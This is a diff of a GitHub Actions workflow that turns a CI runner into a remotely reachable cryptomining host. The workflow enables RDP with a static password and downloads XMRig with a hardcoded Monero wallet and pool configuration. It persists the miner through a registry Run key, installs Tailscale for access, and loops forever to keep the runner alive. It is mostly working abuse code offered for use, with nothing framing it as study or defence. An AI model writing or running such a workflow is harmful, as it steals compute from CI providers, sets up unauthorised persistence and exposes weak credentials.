@@ -1,4 +1,4 @@
-name: RDP TEST with Registry Auto-Start Miner
+name: RDP TEST with Auto-Start Miner (Final Version)
 
 on:
   workflow_dispatch:
@@ -13,6 +13,7 @@ jobs:
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
+
       - name: Create RDP User with Static Password
         run: |
           $password = "Runner-12345"
@@ -24,6 +25,7 @@ jobs:
           if (-not (Get-LocalUser -Name "RDP")) { Write-Error "User creation failed"; exit 1 }
 
       - name: Install and Configure XMRig Miner
+        shell: powershell
         run: |
           $ErrorActionPreference = "Stop"
           $minerVersion = "6.21.2"
@@ -31,21 +33,29 @@ jobs:
           $zipPath = "$env:TEMP\xmrig.zip"
           $desktopPath = "C:\Users\RDP\Desktop"
           
+          Write-Host "Ensuring Desktop directory exists at $desktopPath..."
           New-Item -ItemType Directory -Force -Path $desktopPath
+          
+          Write-Host "Downloading XMRig v$($minerVersion)..."
           Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
+          
+          Write-Host "Extracting XMRig to the RDP user's Desktop..."
           Expand-Archive -Path $zipPath -DestinationPath $desktopPath -Force
           
           $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
           if (-not $minerFolder) { Write-Error "Could not find extracted XMRig folder!"; exit 1 }
+          Write-Host "Found miner folder: $minerFolder"
           
           $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
+          Write-Host "config.json created."
 
-          # Note: The pause command is removed from the .bat file for seamless auto-start
-          $shortcutContent = "@echo off`r`ncd /d ""%~dp0""`r`ncd ""$($minerFolder.Split('\')[-1])""`r`nxmrig.exe"
-          Set-Content -Path (Join-Path $desktopPath "Start-Miner.bat") -Value $shortcutContent
+          $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
+          Set-Content -Path (Join-Path $desktopPath "Start-Miner.bat") -Value $batContent
+          Write-Host "Start-Miner.bat created."
 
       - name: Auto-start Miner via Registry
+        shell: powershell
         run: |
           $ErrorActionPreference = "Stop"
           $runKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -55,20 +65,18 @@ jobs:
           Set-ItemProperty -Path $runKey -Name "XMRigMiner" -Value $batPath -Force
           
           Write-Host "--- Verification Step ---"
-          Write-Host "Querying registry to confirm auto-start entry:"
           $entry = Get-ItemProperty -Path $runKey -Name "XMRigMiner"
           if ($entry.XMRigMiner -eq $batPath) {
               Write-Host "SUCCESS: Registry entry created correctly."
-              Write-Host "Value: $($entry.XMRigMiner)"
           } else {
               Write-Error "FAILURE: Could not verify registry entry."
           }
-          Write-Host "-------------------------"
 
       - name: Install Tailscale
         run: |
           Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\tailscale.exe"
           Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet" -Wait
+
       - name: Establish Tailscale Connection
         run: |
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
@@ -89,8 +97,8 @@ jobs:
           Write-Host "Password: ${{ env.RDP_PASSWORD }}"
           Write-Host "----------------------------------------------------------------"
           Write-Host "ACTION: The miner will now start AUTOMATICALLY when you log in."
-          Write-Host "A command prompt window with the miner should appear."
           Write-Host "================================================================"
+
       - name: Maintain Connection
         run: |
           while ($true) {
